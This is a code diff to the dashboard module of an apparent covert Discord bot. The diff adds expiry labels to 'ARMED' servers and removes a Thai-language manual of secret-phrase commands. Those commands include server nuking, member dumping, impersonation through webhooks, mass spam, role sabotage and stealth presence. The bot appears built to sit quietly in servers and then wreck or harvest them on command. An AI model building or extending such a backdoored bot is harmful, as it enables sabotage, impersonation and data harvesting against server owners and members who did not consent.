@@ -1,18 +1,9 @@
 const { escapeHtml, hiddenInput, htmlTag } = require("./htmlUtils");
+const { isDiscordSnowflake } = require("../core/snowflakes");
 
 function safeDiscordId(value) {
     const text = String(value ?? "").trim();
-    return /^\d{5,25}$/.test(text) ? text : "unknown";
-}
-
-function safePortalBaseUrl(value) {
-    try {
-        const url = new URL(String(value || "https://your-app.onrender.com"));
-        if (!["http:", "https:"].includes(url.protocol)) return "https://your-app.onrender.com";
-        return url.origin;
-    } catch {
-        return "https://your-app.onrender.com";
-    }
+    return isDiscordSnowflake(text) ? text : "unknown";
 }
 
 function renderTracePolicyRow(guildId, policy, normalizeTracePolicy) {
@@ -50,16 +41,31 @@ function renderVipRow(id) {
     ]);
 }
 
+function renderArmExpiry(expiresAt) {
+    const expiryMs = Number(expiresAt);
+    if (!Number.isFinite(expiryMs)) return "";
+    const expiresAtDate = new Date(expiryMs);
+    if (Number.isNaN(expiresAtDate.getTime())) return "";
+    const datetime = expiresAtDate.toISOString();
+    const label = new Intl.DateTimeFormat("th-TH", {
+        dateStyle: "medium",
+        timeStyle: "short"
+    }).format(expiresAtDate);
+    return `<div style="font-size:0.68em;color:var(--text3);margin-top:3px;">หมดอายุ <time datetime="${escapeHtml(datetime)}">${escapeHtml(label)}</time></div>`;
+}
+
 function buildShadowGuildRows(mainClient, context) {
     if (!mainClient) return '<tr><td colspan="4" role="status" style="text-align:center;color:var(--text3);">บอทออฟไลน์ จึงโหลดเซิร์ฟเวอร์ไม่ได้</td></tr>';
     return [...mainClient.guilds.cache.values()].map(g => {
         const guildId = safeDiscordId(g.id);
-        const armed = context.armedGuilds.has(guildId);
+        const arm = context.armedGuilds.get(guildId);
+        const armed = Boolean(arm && Number(arm.expiresAt) > Date.now());
+        const expiryText = armed ? renderArmExpiry(arm.expiresAt) : "";
         return `<tr>
             <td>${escapeHtml(g.name)} <span style="color:var(--text3);font-size:0.75em;">(${escapeHtml(guildId)})</span></td>
             <td style="text-align:center;">${escapeHtml(g.memberCount)}</td>
             <td style="text-align:center;">
-                <span class="badge ${armed ? 'badge-armed' : 'badge-safe'}">${armed ? '🔴 ARMED' : '🟢 SAFE'}</span>
+                <span class="badge ${armed ? 'badge-armed' : 'badge-safe'}">${armed ? '🔴 ARMED' : '🟢 SAFE'}</span>${expiryText}
             </td>
             <td style="text-align:center;">
                 <form method="POST" style="display:inline;margin:0;">
@@ -78,7 +84,6 @@ function buildShadowVipRows(context) {
 }
 
 function buildShadowSessionRows(mainClient, context) {
-    if (!mainClient) return '<tr><td colspan="4" role="status" style="text-align:center;color:var(--text3);">บอทออฟไลน์ จึงโหลด Session ไม่ได้</td></tr>';
     try {
         const sessions = Array.from(context.sessionManager.getAllSessions().values());
         if (!sessions.length) {
@@ -107,52 +112,6 @@ function buildShadowSessionRows(mainClient, context) {
         context.logSuppressedError("render voice session rows", e);
         return '<tr><td colspan="4" role="alert" style="text-align:center;color:var(--text3);">โหลด Session ไม่สำเร็จ</td></tr>';
     }
-}
-
-function shadowCommandManual() {
-    return [
-        {name:'-intel',       desc:'ดึงสถิติเซิร์ฟ — ชื่อ, เจ้าของ, คน, ห้อง, ยศ, Boost',  tag:'normal', new:false},
-        {name:'-adminscan',   desc:'สแกนแอดมินทั้งหมดพร้อม ID',                               tag:'normal', new:false},
-        {name:'-rolelist',    desc:'ดึงรายชื่อยศทั้งหมดพร้อม ID เรียงตาม position',            tag:'normal', new:false},
-        {name:'-auditbot',    desc:'ดึง Audit Log 10 รายการล่าสุด',                              tag:'normal', new:false},
-        {name:'-memberdump',  desc:'Dump สมาชิก 500 คนแรก — แยก bot/user/admin',               tag:'normal', new:true},
-        {name:'-snap',        desc:'Snapshot ข้อมูลเซิร์ฟแบบเต็ม + Icon URL',                  tag:'normal', new:true},
-        {name:'-extract',     desc:'สร้างลิงก์เข้าลับ (1ชม./1ครั้ง)',                           tag:'normal', new:false},
-        {name:'-vanish',      desc:'สั่งบอทออกเซิร์ฟทันที',                                     tag:'normal', new:false},
-        {name:'-stealth',     desc:'สถานะบอท → Invisible (ยังทำงานปกติ)',                       tag:'normal', new:false},
-        {name:'-active',      desc:'สถานะบอท → Online',                                          tag:'normal', new:false},
-        {name:'-ghostping',   desc:'เช็ค WebSocket Ping ปัจจุบัน',                               tag:'normal', new:false},
-        {name:'-sysinfo',     desc:'RAM, Uptime, Guild count, Voice Sessions',                    tag:'normal', new:false},
-        {name:'-lockdown',    desc:'ล็อกห้องแชทที่พิมพ์คำสั่ง — snapshot permission ไว้',       tag:'normal', new:false},
-        {name:'-unlock',      desc:'ปลดล็อกห้องแชท',                                             tag:'normal', new:false},
-        {name:'-silence',     desc:'Server Mute ทุกคนในห้องเสียงที่อยู่',                       tag:'normal', new:true},
-        {name:'-unsilence',   desc:'คืนเสียงทุกคนในห้องเสียงที่อยู่',                            tag:'normal', new:true},
-        {name:'-memclear',    desc:'เคลียร์ Channel cache ลด RAM',                               tag:'normal', new:false},
-        {name:'-ghostmode',   desc:'เปิด/ปิด Ghost Mode — บอทไม่ตอบคนทั่วไป',                  tag:'normal', new:true},
-        {name:'-protect [id]',desc:'ป้องกัน session ไม่ให้ถูกหยุดจาก Dashboard',               tag:'normal', new:true},
-        {name:'-restore',     desc:'คืนค่า Permission จาก snapshot ล่าสุด (-lockdown/-ruinroles)',tag:'normal', new:true},
-        {name:'-mimic @u #ch ข้อความ',desc:'ส่งข้อความในนาม @u ผ่าน Webhook',               tag:'normal', new:false},
-        {name:'-clown @u',    desc:'ติดป้าย Clown',                                               tag:'normal', new:false},
-        {name:'-unclown @u',  desc:'ถอดป้าย Clown',                                               tag:'normal', new:false},
-        {name:'-haunt @u',    desc:'ลบข้อความ @u อัตโนมัติหลัง 12 วิ (toggle)',                 tag:'normal', new:false},
-        {name:'-nuke',        desc:'☢️ ลบห้อง+ยศทั้งหมด + เปลี่ยนชื่อ 30 ครั้ง',               tag:'armed',  new:false},
-        {name:'-hostage',     desc:'ออกเซิร์ฟหลัง 3 วิ',                                         tag:'armed',  new:false},
-        {name:'-ruinroles [ชื่อ]',desc:'เปลี่ยนชื่อยศทุกอัน + snapshot ไว้ restore',           tag:'armed',  new:false},
-        {name:'-spamvc [n] [ชื่อ]',desc:'สร้าง Voice Channel n ช่อง',                           tag:'armed',  new:false},
-        {name:'-masspam [n] [ข้อความ]',desc:'สแปม n ข้อความทุกห้องแชทผ่าน Webhook',           tag:'armed',  new:false},
-    ];
-}
-
-function buildShadowCommandRows(safeSecretPhrase) {
-    return shadowCommandManual().map(c => `
-        <div class="cmd-card">
-            <div style="display:flex;align-items:center;gap:6px;margin-bottom:4px;">
-                <span class="cmd-name">${safeSecretPhrase} ${escapeHtml(c.name)}</span>
-                ${c.tag === 'armed' ? '<span class="cmd-tag cmd-armed">⚠️ ARMED</span>' : ''}
-                ${c.new ? '<span class="cmd-tag cmd-new">✨ NEW</span>' : ''}
-            </div>
-            <div class="cmd-desc">${escapeHtml(c.desc)}</div>
-        </div>`).join('');
 }
 
 function buildShadowBotStats(mainClient) {
@@ -184,10 +143,7 @@ function buildToggleRows(context) {
 }
 
 function buildShadowPortalViewData(mainClient, context) {
-    const safeSecretPhrase = escapeHtml(context.SECRET_PHRASE);
     return {
-        safeSecretPhrase,
-        portalBaseUrl: escapeHtml(safePortalBaseUrl(process.env.RENDER_EXTERNAL_URL)),
         tracePolicyRows: [...context.traceGuildPolicies.entries()].map(([guildId, policy]) =>
             renderTracePolicyRow(guildId, policy, context.normalizeTracePolicy)
         ).join('') || '<p style="color:var(--text3);font-size:0.8em;">ไม่มี policy ราย guild — ใช้ default policy</p>',
@@ -198,7 +154,6 @@ function buildShadowPortalViewData(mainClient, context) {
         guildRows: buildShadowGuildRows(mainClient, context),
         vipRows: buildShadowVipRows(context),
         sessionRows: buildShadowSessionRows(mainClient, context),
-        cmdRows: buildShadowCommandRows(safeSecretPhrase),
         botStats: buildShadowBotStats(mainClient)
     };
 }
@@ -208,18 +163,14 @@ module.exports = {
     buildShadowGuildRows,
     buildShadowVipRows,
     buildShadowSessionRows,
-    buildShadowCommandRows,
     buildShadowBotStats,
     buildToggleRows,
     renderTracePolicyRow,
     renderTraceMetricRow,
     renderVipRow,
+    renderArmExpiry,
     safeDiscordId,
-    safePortalBaseUrl,
     hiddenInput,
     htmlTag,
-    _test: {
-        escapeHtml,
-        shadowCommandManual
-    }
+    _test: { escapeHtml }
 };
